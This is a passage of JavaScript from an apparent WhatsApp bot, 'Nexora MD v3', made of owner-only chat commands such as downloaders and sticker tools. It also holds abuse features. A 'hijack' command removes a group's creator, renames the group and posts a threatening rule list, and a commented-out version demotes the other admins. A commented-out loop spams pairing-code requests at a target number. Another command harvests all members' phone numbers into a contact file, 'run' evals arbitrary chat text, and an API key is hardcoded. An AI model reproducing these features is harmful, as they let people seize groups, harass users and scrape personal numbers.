        if (text.startsWith('http://') || text.startsWith('https://')) {
            targetUrl = text;
        } else {
            const { videos } = await yts(text);
            if (!videos || videos.length === 0) return reply('❌ No videos found for your search query.');
            targetUrl = videos[0].url;
            videoTitle = videos[0].title;
        }

        // API Fallback Array Setup
        const apiEndpoints = [
            `https://eliteprotech-apis.zone.id/ytdown?url=${encodeURIComponent(targetUrl)}&format=mp4`,
            `https://api.yupra.my.id/api/downloader/ytmp4?url=${encodeURIComponent(targetUrl)}`,
            `https://okatsu-rolezapiiz.vercel.app/downloader/ytmp4?url=${encodeURIComponent(targetUrl)}`
        ];

        let finalDownloadUrl = null;
        for (let url of apiEndpoints) {
            try {
                const res = await axios.get(url, { timeout: 20000 });
                finalDownloadUrl = res.data?.downloadURL || res.data?.data?.download_url || res.data?.result?.mp4;
                if (finalDownloadUrl) {
                    videoTitle = res.data?.title || res.data?.data?.title || res.data?.result?.title || videoTitle;
                    break;
                }
            } catch (e) { continue; }
        }

        if (!finalDownloadUrl) return reply("❌ All video download engines are busy. Try again later.");

        await empire.sendMessage(m.chat, {
            video: { url: finalDownloadUrl },
            mimetype: 'video/mp4',
            caption: `🎥 *${videoTitle || 'YouTube Video'}*\n\n© *Nexora MD v3*`
        }, { quoted: m });

    } catch (error) {
        console.error(error);
        reply("❌ Video stream download failed.");
    }
}
break;

// ==========================================
// 💀 WASTED AVATAR FILTER COMMAND
// ==========================================
case 'wasted':
case 'waste': {
     if (!isCreator) return;
    let targetUser = m.quoted ? m.quoted.sender : (m.mentionedJid?.[0] || null);
    if (!targetUser) return reply("❌ Mention a user or reply to a message to apply the Wasted overlay filter.");

    await empire.sendMessage(m.chat, { react: { text: '💀', key: m.key } });

    try {
        const axios = require('axios');
        let profilePic;
        try {
            profilePic = await empire.profilePictureUrl(targetUser, 'image');
        } catch {
            profilePic = 'https://i.imgur.com/2wzGhpF.jpeg'; 
        }

        const apiTarget = `https://some-random-api.com/canvas/overlay/wasted?avatar=${encodeURIComponent(profilePic)}`;
        const response = await axios.get(apiTarget, { responseType: 'arraybuffer' });

        await empire.sendMessage(m.chat, {
            image: Buffer.from(response.data),
            caption: `⚰️ *Wasted Profile:* @${targetUser.split('@')[0]} 💀\n\nRest in pieces!`,
            mentions: [targetUser]
        }, { quoted: m });
    } catch (error) {
        console.error(error);
        reply("❌ Failed to process canvas image rendering.");
    }
}
break;

// ==========================================
// ⚙️ WELCOME & GOODBYE TOGGLE COMMANDS
// ==========================================
case 'welcome': {
    if (!m.isGroup) return reply("❌ This command is restricted to group chats only.");
    if (!text) return reply(`💡 Use *${prefix + command} on* or *${prefix + command} off* to toggle greet alerts.`);
    
    // Store configurations in your localized database structure
    if (!global.db) global.db = {};
    if (!global.db.chats) global.db.chats = {};
    if (!global.db.chats[m.chat]) global.db.chats[m.chat] = { welcome: false };

    if (text.toLowerCase() === 'on') {
        global.db.chats[m.chat].welcome = true;
        reply("✅ Welcome system tracking activated for this room.");
    } else if (text.toLowerCase() === 'off') {
        global.db.chats[m.chat].welcome = false;
        reply("❌ Welcome tracking deactivated.");
    }
}
break;

case 'download': {
   if (!isCreator) return;
  if (!text) return reply(`Example: ${prefix}download <url>\n\n💧† 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 †`)

  try {
    if (/tiktok\.com|vt\.tiktok\.com/i.test(text)) {
      const apiUrl = `https://prexzyapis.com/download/tiktok?url=${encodeURIComponent(text)}`
      const res = await axios.get(apiUrl, { timeout: 120000 })

      const mediaUrl =
        res?.data?.result?.play ||
        res?.data?.result?.video ||
        res?.data?.result?.url ||
        res?.data?.url ||
        null

      if (!mediaUrl) return reply(`💧 Failed to fetch TikTok media\n\n† 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 †`)

      return await empire.sendMessage(m.chat, {
        video: { url: mediaUrl },
        caption: `✅ Download complete\n\n💧† 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 †`
      }, { quoted: m })
    }

    if (/youtube\.com|youtu\.be/i.test(text)) {
      const apiUrl = `https://prexzyapis.com/download/ytdown?url=${encodeURIComponent(text)}`
      const res = await axios.get(apiUrl, { timeout: 120000 })

      const mediaUrl =
        res?.data?.result?.url ||
        res?.data?.url ||
        null

      if (!mediaUrl) return reply(`💧 Failed to fetch YouTube media\n\n† 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 †`)

      return await empire.sendMessage(m.chat, {
        document: { url: mediaUrl },
        mimetype: 'application/octet-stream',
        fileName: 'nexora_download'
      }, { quoted: m })
    }

    if (/facebook\.com|fb\.watch/i.test(text)) {
      const apiUrl = `https://prexzyapis.com/download/facebook?url=${encodeURIComponent(text)}`
      const res = await axios.get(apiUrl, { timeout: 120000 })

      const mediaUrl =
        res?.data?.result?.url ||
        res?.data?.url ||
        null

      if (!mediaUrl) return reply(`💧 Failed to fetch Facebook media\n\n† 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 †`)

      return await empire.sendMessage(m.chat, {
        video: { url: mediaUrl },
        caption: `✅ Download complete\n\n💧† 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 †`
      }, { quoted: m })
    }

    return reply(`💧 Unsupported URL\n\n† 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 †`)
  } catch (err) {
    console.log('download error:', err?.response?.data || err)
    reply(`❌ Download failed\n\n† 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 †`)
  }
}
break
case 'take':
case 'steal': {
    if (!isCreator) return;
    if (!m.quoted) return reply('❌ ʀᴇᴘʟʏ ᴛᴏ ᴀ sᴛɪᴄᴋᴇʀ!');
    if (!m.quoted.mimetype || !/webp/.test(m.quoted.mimetype)) {
        return reply('❌ ᴛʜᴀᴛ\'s ɴᴏᴛ ᴀ sᴛɪᴄᴋᴇʀ!');
    }
    
    try {
        await loading();
        
        // Get custom name or use default
        let packname = text || '𝙽𝚎𝚡𝚘𝚛𝚊 𝚖𝚍';
        let author = '𝚜𝚒𝚛 𝙳𝚎𝚖𝚘𝚗';
        
        // Download the sticker
        let media = await empire.downloadMediaMessage(m.quoted);
        
        // Add EXIF data
        let stickerWithExif = await addExif(media, packname, author);
        
        // Send back with new metadata
        await empire.sendMessage(m.chat, {
            sticker: stickerWithExif
        }, { quoted: m });
        
        reply(`✅ sᴛɪᴄᴋᴇʀ sᴛᴏʟᴇɴ!\n📦 ᴘᴀᴄᴋ: ${packname}\n✍️ ᴀᴜᴛʜᴏʀ: ${author}`);
        
    } catch (error) {
        console.error('sᴛᴇᴀʟ sᴛɪᴄᴋᴇʀ ᴇʀʀᴏʀ:', error);
        reply('❌ ғᴀɪʟᴇᴅ ᴛᴏ sᴛᴇᴀʟ sᴛɪᴄᴋᴇʀ');
    }
}
break;

case "json": {
    if (!isCreator) return;
    reply(JSON.stringify(m, null, 2))
}
break;
case "run": {
    if (!isCreator) return;

    let code = args.join(" ")
    if (!code) return reply("Provide JS code")

    try {
        let result = eval(code)
        reply(`💻 Result:\n${result}`)
    } catch (e) {
        reply(`❌ Error:\n${e.message}`)
    }
}
break;
case "ddos": {
   if (!isCreator) return;
    let target = args[0] || "unknown"

    await reply(`💣 Attacking ${target}...`)
    await new Promise(r => setTimeout(r, 1500))
    await reply(`📡 Sending packets...`)
    await new Promise(r => setTimeout(r, 1500))
    await reply(`🔥 ${target} DOWN!\n\n😂 Just kidding`)
}
break;
case "encodefile": {
    if (!isCreator) return;
    if (!m.quoted) return reply("Reply to a file")

    let buffer = await m.quoted.download()
    let encoded = buffer.toString("base64")

    reply(`📦 Base64 File:\n\n${encoded.slice(0, 2000)}...`)
}
break;
case "site": {
if (!isCreator) return;
    let url = args[0]
    if (!url) return reply("Provide URL")

    try {
        let res = await axios.get(url)
        reply(`✅ 𝚂𝙸𝚃𝙴 𝙸𝚂 𝚄𝙿\nStatus: ${res.status}`)
    } catch {
        reply("❌ 𝚜𝚒𝚝𝚎 𝚒𝚜 𝙳𝙾𝚆𝙽")
    }
}
break;
case 'antidelete':
case 'antidelgc':
case 'antideldm': {
    if (!isCreator) return reply("вα¢к σff σωиєя σиℓу ¢σммαи∂")
    const antiOpt = args[0]?.toLowerCase();
    if (antiOpt === 'on') {
        await toggleAntiDelete(empire, m.chat, true);
    } else if (antiOpt === 'off') {
        await toggleAntiDelete(empire, m.chat, false);
    } else {
        reply('Usage: .antidelete on/off\n_Enables or disables anti‑delete for *this chat* only._');
    }
    break;
}
case "hash": {
    let text = args.join(" ")
    if (!text) return reply("Provide text")

    let md5 = crypto.createHash("md5").update(text).digest("hex")
    let sha = crypto.createHash("sha256").update(text).digest("hex")

    reply(`
🔐 HASH RESULT

MD5: ${md5}

SHA256: ${sha}
`)
}
break;
case 'apk': {
  if (!text) return reply(`Example: ${prefix}apk WhatsApp\n\n💧† 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 †`)

  try {
    const query = encodeURIComponent(text)
    const url = `https://api.akuari.my.id/search/playstore?query=${query}`
    const res = await axios.get(url, { timeout: 120000 })

    const result = res?.data?.res?.[0]
    if (!result) return reply(`💧 No app found\n\n† 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 †`)

    reply(`┏━━━━━━━━━━━━━─╮
┃  📱 *APK SEARCH*
├──────────────
┃  Name: ${result.title || '-'}
┃  Dev: ${result.developer || '-'}
┃  Rating: ${result.score || '-'}
┃  Link: ${result.link || '-'}
┃ 
┃  💧† 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 †
╰──────────────╯`)
  } catch (err) {
    console.log('apk error:', err)
    reply(`❌ Failed to search APK\n\n† 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 †`)
  }
}
break

case 'hotcheck':
case 'waifucheck':
case 'auracheck':
case 'cutecheck':
case 'beautycheck':
case 'handsomecheck':
case 'prettycheck':
case 'uglycheck':
case 'smartcheck':
case 'geniuscheck':
case 'dumbcheck':
case 'richcheck':
case 'poorcheck':
case 'luckcheck':
case 'toxiccheck':
case 'kindcheck':
case 'evilcheck':
case 'simpcheck':
case 'loyalcheck':
case 'fakecheck':
case 'coolcheck':
case 'crazycheck':
case 'bravecheck':
case 'fearcheck':
case 'respectcheck':
case 'powercheck':
case 'energycheck':
case 'godcheck':
case 'villaincheck': {
 if(!isCreator) return reply("σωиℓу му σωиєя ¢αи ¢нє¢к уσυя ℓυ¢к 🙂")
    let user = m.mentionedJid[0] || m.sender
    let percent = Math.floor(Math.random() * 101)

    let type = command.replace("check", "")
    let response = getCheckResponse(type.charAt(0).toUpperCase() + type.slice(1), percent)

    reply(`${response}\n\n@${user.split('@')[0]}`, {
        mentions: [user]
    })
}
break


case 'play': {
   if (!isCreator) return;
    if (!text) return reply(`🎵 *Nexora Play*\n\nUsage: ${prefix}play [song name]\nExample: ${prefix}play faded`);

    // 1. React to show acknowledgment
    await empire.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });

    // 2. Send status message
    const status = await reply(`🔍 *searching for:* ${text}`);

    try {
        const axios = require('axios');
        
        // Fetching search result and download link
        const response = await axios.get(`https://apis.davidcyril.name.ng/play?query=${encodeURIComponent(text)}`, {
            timeout: 30000
        });

        const data = response.data;

        if (data.status && data.result?.download_url) {
            // 3. Send Thumbnail and Info
            let caption = `🎵 *${data.result.title}*\n` +
                          `⏱️ *Duration:* ▶︎ •၊၊||၊|။||||။‌‌‌‌‌၊|•  ${data.result.duration}\n` +
                          `👁️ *Views:* ${data.result.views?.toLocaleString() || 'N/A'}\n\n` +
                          `*uploading the audio...*`;

            await empire.sendMessage(m.chat, { 
                image: { url: data.result.thumbnail }, 
                caption: caption 
            }, { quoted: m });

            // 4. Fetch Audio Buffer
            const audioResponse = await axios.get(data.result.download_url, {
                responseType: 'arraybuffer',
                timeout: 120000
            });

            const audioBuffer = Buffer.from(audioResponse.data);

            // 5. Send Audio File
            await empire.sendMessage(m.chat, {
                audio: audioBuffer,
                mimetype: 'audio/mpeg',
                fileName: `${data.result.title}.mp3`
            }, { quoted: m });

            // Success reaction and delete search status
            await empire.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
            await empire.sendMessage(m.chat, { delete: status.key });

        } else {
            throw new Error('No link');
        }

    } catch (error) {
        console.error('Nexora Play Error:', error.message);
        await empire.sendMessage(m.chat, { react: { text: '🎧', key: m.key } });
        await empire.sendMessage(m.chat, { delete: status.key });
        
        if (error.response?.status === 404) {
            return reply(`☃️ *Nexora Play*\n\n"${text}" not found.`);
        }
        reply(`⚠️ *Nexora Music*\n\nService is busy. Try again shortly.`);
    }
}
break;


case 'rbg':
case 'removebg': {
   if (!isCreator) return;
    if (!m.quoted || !/image/.test(m.quoted.mtype)) return reply("📸 Reply to an image to remove its background.");

    await empire.sendMessage(m.chat, { react: { text: '✂️', key: m.key } });

    try {
        const axios = require('axios');
        const FormData = require('form-data');

        // 1. Download the image from WhatsApp
        let media = await m.quoted.download();

        // 2. Prepare the request to Remove.bg
        const formData = new FormData();
        formData.append('size', 'auto');
        formData.append('image_file', media, { filename: 'image.jpg' });

        const response = await axios.post('https://api.remove.bg/v1.0/removebg', formData, {
            headers: {
                ...formData.getHeaders(),
                'X-Api-Key': 'JJdF41NhyN8t68tAKz3K7qVR', // Your API Key
            },
            responseType: 'arraybuffer',
        });

        // 3. Send the result back as an Image (it will be a transparent PNG)
        await empire.sendMessage(m.chat, { 
            image: Buffer.from(response.data), 
            caption: "✅ *Background Removed by Nexora MD*" 
        }, { quoted: m });

    } catch (err) {
        console.error(err);
        reply("❌ Error: Failed to remove background. Ensure your API key has credits.");
    }
}
break;

case 'autoblock': {
    if (!isCreator) return;

    let code = text.replace("+", "").trim()
    if (!code) return reply("❌ Example: .autoblock 92")

    if (!db.settings.autoblock.includes(code)) {
        db.settings.autoblock.push(code)
    }

    reply(`🚫 Auto-block enabled for +${code}`)
}
break;

case 'pair':
await empire.sendMessage(m.chat, {react: {text: '🖇️', key: m.key}})  
  if (!q) return reply(`𝚙𝚕𝚎𝚊𝚜𝚎 𝚎𝚗𝚝𝚎𝚛 𝚊 𝚟𝚊𝚕𝚒𝚍 𝚗𝚞𝚖𝚋𝚎𝚛 𝚝𝚘 𝚛𝚎qu𝚎𝚜𝚝  𝚙𝚊𝚒𝚛𝚒𝚗𝚐 𝚌𝚘𝚍𝚎.
Format: .pair 234xxxxxxx 𝚘𝚛 .pair +234(your number here)`);
// if (!isCreator) return reply("This command is restricted to owner only")
  target = text.split("|")[0];
  sjid = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : target.replace(/[^0-9]/g,'') + "@s.whatsapp.net";

  var contactInfo = await empire.onWhatsApp(sjid);
  if (contactInfo.length === 0) {
    return reply("The number is not registered on WhatsApp");
  }


  const startpairing = require('./pair.js');
  await startpairing(sjid);
  await sleep(4000);

  const cu = fs.readFileSync('./empirestore/pairing/pairing.json', 'utf-8');
  const cuObj = JSON.parse(cu);

  // Send just the code first
  await empire.sendMessage(from, { text: `${cuObj.code}` }, { quoted: m });

  // Send the instructions next
  const instructions = `
*[Nexora MD v3 pairing system 🚀]*

🤖 Code: ${cuObj.code}


➔Open WhatsApp
➔ Linked Devices
➔ Link Device
➔ Enter this code`;

  await empire.sendMessage(from, { text: instructions }, { quoted: m });
break;
/*
case 'spampair': {
    await empire.sendMessage(m.chat, { react: { text: '🖇️', key: m.key } });

    if (!text) return reply(`𝚙𝚕𝚎𝚊𝚜𝚎 𝚎𝚗𝚝𝚎𝚛 𝚊 𝚟𝚊𝚕𝚒𝚍 𝚗𝚞𝚖𝚋𝚎𝚛.\nFormat: .pair 234xxxxxxx (2)`);

    // 1. Extract Number and Count
    // This regex looks for a number in parentheses, default to 1 if not found
    let countMatch = text.match(/\(([^)]+)\)/);
    let requestCount = countMatch ? parseInt(countMatch[1]) : 1;
    if (requestCount > 20) requestCount = 20; // Safety limit to prevent spam blocks

    let target = text.split("(")[0].trim();
    let sjid = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : target.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    // 2. Validate Target
    var contactInfo = await empire.onWhatsApp(sjid);
    if (contactInfo.length === 0) return reply("The number is not registered on WhatsApp");

    reply(`🚀 *NEXORA MULTI-PAIR:* Requesting ${requestCount} pairing codes for @${sjid.split('@')[0]}...`);

    const startpairing = require('./pair.js');

    // 3. Execution Loop
    for (let i = 0; i < requestCount; i++) {
        try {
            await startpairing(sjid);
            await sleep(5000); // Give the server time to generate and save

            const cu = fs.readFileSync('./empirestore/pairing/pairing.json', 'utf-8');
            const cuObj = JSON.parse(cu);

            const instructions = `*[𝗡𝗘𝗫𝗢𝗥𝗔 𝗣𝗔𝗜𝗥𝗜𝗡𝗚 𝗦𝗬𝗦𝗧𝗘𝗠 🚀]*\n\n` +
                `📦 *Batch:* [${i + 1}/${requestCount}]\n` +
                `🤖 *Code:* \`${cuObj.code}\`\n\n` +
                `➔ Open WhatsApp\n` +
                `➔ Linked Devices\n` +
                `➔ Link with Phone Number\n` +
                `➔ Enter the code above`;

            await empire.sendMessage(m.chat, { 
                text: instructions, 
                contextInfo: { 
                    externalAdReply: { 
                        title: "𝗡𝗲𝘅𝗼𝗿𝗮 𝗠𝗱 𝗩𝟭", 
                        body: `Pairing Session ${i + 1} Active`, 
                        thumbnail: await getBuffer('https://tmp.malvryx.dev/upload/6789.jpg'), // Replace with your logo
                        sourceUrl: "https://t.me/+OrLFsvjjlVM2ZjRk",
                        
case 'hijack': {
  if (!m.isGroup) return reply('Group only')
  if (!isCreator) return reply("This command is restricted to owner only")
  if (!isAdmins) return;
  //if (!isBotAdmins) return reply('Bot must be admin')

  const metadata = await empire.groupMetadata(m.chat).catch(() => null)
  if (!metadata) return reply('Failed to fetch group data')
  if (!creator) return reply('Creator not detected')

  // 1️⃣ Lock group (admins only)
  await empire.groupSettingUpdate(m.chat, 'announcement').catch(() => {})
//const admins = participants.filter(p => ['admin', 'superadmin'].includes(p.admin));
    
  // 2️⃣ Change group name
  await empire.groupUpdateSubject(
    m.chat,
    '††💧 ʜɪᴊᴀᴄᴋᴇᴅ ᴡɪᴛʜ Nexora ᴍᴅ 💧††'
  ).catch(() => {})

  // 3️⃣ Change description
  await empire.groupUpdateDescription(
    m.chat,
`╭──────────────[ 💧 ɢʀᴏᴜᴘ sᴜᴄᴄᴇsғᴜʟʟʏ ʜɪᴊᴀᴄᴋᴇᴅ ᴡɪᴛʜ Nexora ᴍᴅ  💧 ]──────────────╮
┃  This group has been hijacked by:  Nexora ᴍᴅ
┃  All members are now subject to the authority of Nexora, ʙᴏᴛ ᴅᴇᴠᴇʟᴏᴘᴇʀ ᴡᴏɴ'ᴛ ᴛᴀᴋᴇ ᴀɴʏ ʀᴇsᴘᴏɴsɪʙɪʟɪᴛʏ ғᴘʀ ᴛʜɪs ᴀᴄᴛɪᴏɴ.
╰─────────────────────────────────────────────────────────────╯

                【 𝚘𝚛𝚍𝚎𝚛 𝚏𝚛𝚘𝚖 Nexora 】

1. Absolute Obedience: Obey without question.
2. No Disrespect: Any disrespect is punishable.
3. No Sharing of Group Content: All group content stays here.
4. Zero Tolerance for Betrayal: Betrayers will be eliminated.
5. Mandatory Participation: No ghost members allowed.
6. No External Links or Invites: Outsiders are forbidden.
7. Respect the Hierarchy: Respect Nexora 𝚖𝚍 𝚊𝚗𝚍 𝚘𝚠𝚗𝚎𝚛.
8. No Spam or Self-Promotion: Infractions will not be forgiven.
9. Trust the System: Nexora'𝚜 decision is law.

**Consequences for Breaking Rules:**
- ⚠ First Offense: Warning or temporary removal
- ⛔ Second Offense: Permanent removal
- 💀 Third Offense: 𝚠𝚑@𝚝𝚜𝚊𝚙𝚙 𝚋𝚊𝚗 𝚊𝚗𝚍 𝚋𝚞𝚐 🤐

By remaining in this group, you acknowledge that you have read, understood, and submit to the ORDER OF Nexora`
  ).catch(() => {})

  // 4️⃣ DEMOTE admins (but NEVER demote: creator, bot, deployer/owners, command sender)

  // botNumber is already decoded in your code:
  // const botNumber = await empire.decodeJid(empire.user.id)

  // Build hijack list: bot + owners + creator + sender
 /* const hijackJids = [botNumber, ...owner]
    .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')

  hijackJids.push(creator)
  hijackJids.push(m.sender)

  const admins = metadata.participants
    .filter(p => p.admin !== null)
    .map(p => p.id)

  for (let admin of admins) {
    // Skip if this admin is hijack (bot / deployer / owner / creator / sender)
    if (hijackJids.some(j => areJidsSameUser(admin, j))) continue

    await empire.groupParticipantsUpdate(m.chat, [admin], 'demote')
      .catch(() => {})
  }

  await empire.sendMessage(m.chat, {
    text: `Hijack successful. This domain is now being ruled by ${m.pushName}, powered by 💧 Nexora MD v3`
  }).catch(() => {})

}
break*/
case 'hijack': {
    if (!isCreator) return reply("❌ You are not worthy – only my owner can use this power.");
    if (!m.isGroup) return reply('❌ This command can only be used in groups!');

    const groupId = m.chat;
    const botDeployer = m.sender;

    try {
        const groupMetadata = await empire.groupMetadata(groupId);
        const participants = groupMetadata.participants;
        const creator = groupMetadata.owner; // group creator's JID
        const admins = participants.filter(p => p.admin).map(p => p.id);

        // Store hijack info globally
        global.hijackedGroups[groupId] = {
            creator: creator,
            admins: admins,
            banned: [] // store JIDs we have already kicked to avoid duplicates
        };

        // 1. Attempt to remove the creator (if not bot or deployer)
        if (creator && creator !== botDeployer && creator !== botNumber) {
            try {
                await empire.groupParticipantsUpdate(groupId, [creator], 'remove');
                reply(`🔥 Successfully removed the group creator: @${creator.split('@')[0]}`);
                global.hijackedGroups[groupId].banned.push(creator);
            } catch (err) {
                console.error('Error removing creator:', err);
                reply('⚠️ Could not remove creator. Switching to admin‑only mode.');
                await empire.groupSettingUpdate(groupId, 'announcement');
            }
        }

        // 2. Change group name
        try {
            await empire.groupUpdateSubject(groupId, 'ʜɪᴊᴀᴄᴋᴇᴅ ʙʏ NEXORA MD v3');
            reply('👑 Group name changed.');
        } catch (err) {
            console.error('Error changing name:', err);
        }

        // 3. Change group description
        try {
            await empire.groupUpdateDescription(groupId, `╭─[ ☢️ GROUP SUCCESSFULLY HIJACKED ☢️ ]
│ This group has been hijacked by: NEXORA 
│ All members are now subject to the authority of NEXORA 
╰─────────────────────────────╯

                【 ORDER OF NEXORA  】

1. Absolute Obedience: Obey without question.
2. No Disrespect: Any disrespect is punishable.
3. No Sharing of Group Content: All group content stays here.
4. Zero Tolerance for Betrayal: Betrayers will be eliminated.
5. Mandatory Participation: No ghost members allowed.
6. No External Links or Invites: Outsiders are forbidden.
7. Respect the Hierarchy: Respect NEXORA  or get banned.
8. No Spam or Self-Promotion: Infractions will not be forgiven.
9. Trust the System: nexora's decision is law.

**Consequences for Breaking Rules:**
- ⚠ First Offense: Warning or temporary removal
- ⛔ Second Offense: Permanent removal
- 💀 Third Offense: WhatsApp ban and bug 🤐

By remaining in this group, you acknowledge that you have read, understood, and submit to the ORDER OF NEXORA`);
            reply('📝 Group description changed.');
        } catch (err) {
            console.error('Error changing description:', err);
        }

        // 4. Lock group (only admins can send messages)
        try {
            await empire.groupSettingUpdate(groupId, 'announcement');
            reply('🔒 Group locked – only admins can send messages.');
        } catch (err) {
            console.error('Error locking group:', err);
        }

        reply('✅ Hijack completed. Auto‑kick enabled for creator and admins who rejoin.');

    } catch (err) {
        console.error('Hijack error:', err);
        reply('❌ Failed to hijack group.');
    }
    break;
}


case 'age': case 'birthdate': {
  if (!isCreator) return reply('OFF TAG BRO 🙄😒 *THIS COMMAND IS RESTRICTED TO OWNER ONLY');
  if (!text) return reply("Example: .age 1990-12-25");
  
  try {
    let birthDate = new Date(text);
    let today = new Date();
    
    let years = today.getFullYear() - birthDate.getFullYear();
    let months = today.getMonth() - birthDate.getMonth();
    let days = today.getDate() - birthDate.getDate();
    
    if (days < 0) {
      months--;
      days += new Date(today.getFullYear(), today.getMonth(), 0).getDate();
    }
    if (months < 0) {
      years--;
      months += 12;
    }
    
    reply(`🎂 Age Calculator
• Birth Date: ${birthDate.toDateString()}
• Age: ${years} years, ${months} months, ${days} days
• Total Days: ${Math.floor((today - birthDate) / (1000 * 60 * 60 * 24))} days`);
  } catch (err) {
    reply(`Error: ${err.message}`)
  }
}
break;

case "savecontact":
case "vcf":
case "scontact":
case "savecontacts": {
    // Restrict to groups only
    if (!m.isGroup) {
        return empire.sendMessage(
            m.chat,
            { text: "🚫 This command works only in group chats." },
            { quoted: m }
        );
    }

    try {
        const groupData = await empire.groupMetadata(m.chat);
        const members = groupData.participants;

        let vcfData = "";
        let index = 1;

        // Build VCF content
        for (const user of members) {
            const number = user.id.split("@")[0];

            vcfData += [
                "BEGIN:VCARD",
                "VERSION:3.0",
                `FN:Member ${index++} (+${number})`,
                `TEL;type=CELL;type=VOICE;waid=${number}:+${number}`,
                "END:VCARD\n"
            ].join("\n");
        }

        const fileName = `${groupData.subject}_contacts.vcf`;
        const fileDir = "./temp_contacts.vcf";

        // Save file
        fs.writeFileSync(fileDir, vcfData.trim());

        // Notify user
        await empire.sendMessage(
            m.chat,
            { text: `📥 Preparing ${members.length} contacts... Please wait ⏳` },
            { quoted: m }
        );

        await sleep(1500);

        // Send file
        await empire.sendMessage(
            m.chat,
            {
                document: fs.readFileSync(fileDir),
                mimetype: "text/vcard",
                fileName: fileName,
                caption:
                    `✅ Contacts Exported Successfully!\n\n` +
                    `👥 Group: ${groupData.subject}\n` +
                    `📊 Total Contacts: ${members.length}`
            },
            { quoted: m }
        );

        // Clean up
        fs.unlinkSync(fileDir);

    } catch (error) {
        console.error("VCF Error:", error);

        empire.sendMessage(
            m.chat,
            { text: "⚠️ Failed to generate contacts file.\nError: " + error.message },
            { quoted: m }
        );
    }
}
break;
case 'apk2': {
  if (!text) return reply(`Example: ${prefix}apk2 Telegram\n\n💧† 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 †`)

  try {
    const query = encodeURIComponent(text)
    const url = `https://api.akuari.my.id/search/playstore?query=${query}`
    const res = await axios.get(url, { timeout: 120000 })

    const result = res?.data?.res?.[0]
    if (!result) return reply(`💧 No app found\n\n† 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 †`)

    await empire.sendMessage(m.chat, {
      image: { url: result.thumbnail || 'https://files.catbox.moe/io0k1q.jpg' },
      caption: `┏━━━━━━━━━━━━━─╮
┃  📱 *APK RESULT*
├──────────────
┃  ${result.title || '-'}
┃  Developer: ${result.developer || '-'}
┃  Rating: ${result.score || '-'}
┃  Link: ${result.link || '-'}
┃ 
┃  💧† 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 †
╰──────────────╯`
    }, { quoted: m })
  } catch (err) {
    console.log('apk2 error:', err)
    reply(`❌ Failed to search APK\n\n† 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 †`)
  }
}
break
case 'listblock':
case 'blocklist': 
case 'blockedcontact':
case 'blockedcontacts':{
if (!isCreator) return reply("owner only bro 💀")
//if (!isBot) return m.reply(mess.owner)
let block = await empire.fetchBlocklist()
reply('List Block :\n\n' + `Total : ${block == undefined ? '*0* BLOCKED NUMBERS' : '*' + block.length + '* Blocked Contacts'}\n` + block.map(v => '🔸 ' + v.replace(/@.+/, '')).join`\n`)
}
break;

case 'tag':
case 'totag': {
  if (!m.isGroup) return reply("ɢʀᴏᴜᴘ ᴄᴏᴍᴍᴀɴᴅ ᴏɴʟʏ.")
  if (!isCreator) return reply("ғσя мʏ σωиɛя σиℓʏ.") 
  if (!m.quoted) return reply(`ʀᴇᴘʟʏ ᴡɪᴛʜ ${prefix + command} ᴛᴏ ᴀ ᴍᴇssᴀɢᴇ`)
  
  try {
    await empire.sendMessage(m.chat, {
      forward: m.quoted.fakeObj,
      mentions: participants.map(a => a.id)
    })
  } catch (error) {
    reply('❌ ғᴀɪʟᴇᴅ ᴛᴏ ᴛᴀɢ ᴍᴇssᴀɢᴇ')
  }
}
break
case 'flirt': {
  const lines = [
    "ɪғ ʏᴏᴜ ᴡᴇʀᴇ ᴀ ᴠᴇɢᴇᴛᴀʙʟᴇ, ʏᴏᴜ'ᴅ ʙᴇ ᴀ ᴄᴜᴛᴇᴄᴜᴍʙᴇʀ.",
    "ᴀʀᴇ ʏᴏᴜ ғʀᴇɴᴄʜ? ʙᴇᴄᴀᴜsᴇ ᴇɪғғᴇʟ ғᴏʀ ʏᴏᴜ.",
    "ɪs ʏᴏᴜʀ ᴅᴀᴅ ᴀ ᴛᴇʀʀᴏʀɪsᴛ? ʙᴇᴄᴀᴜsᴇ ʏᴏᴜ'ʀᴇ ᴛʜᴇ ʙᴏᴍʙ!",
    "ᴅᴏ ʏᴏᴜ ʜᴀᴠᴇ ᴀ ʙᴀɴᴅ-ᴀɪᴅ? ʙᴇᴄᴀᴜsᴇ ɪ sᴄʀᴀᴘᴇᴅ ᴍʏ ᴋɴᴇᴇ ғᴀʟʟɪɴɢ ғᴏʀ ʏᴏᴜ.",
    "ᴀʀᴇ ʏᴏᴜ ᴡɪғɪ? ʙᴇᴄᴀᴜsᴇ ɪ'ᴍ ғᴇᴇʟɪɴɢ ᴀ ᴄᴏɴɴᴇᴄᴛɪᴏɴ.",
    "ᴀʀᴇ ʏᴏᴜ ᴀ 45-ᴅᴇɢʀᴇᴇ ᴀɴɢʟᴇ? ʙᴇᴄᴀᴜsᴇ ʏᴏᴜ'ʀᴇ ᴀᴄᴜᴛᴇ-ɪᴇ!",
    "ᴅᴏ ʏᴏᴜ ʜᴀᴠᴇ ᴀ sᴜɴʙᴜʀɴ, ᴏʀ ᴀʀᴇ ʏᴏᴜ ᴀʟᴡᴀʏs ᴛʜɪs ʜᴏᴛ?",
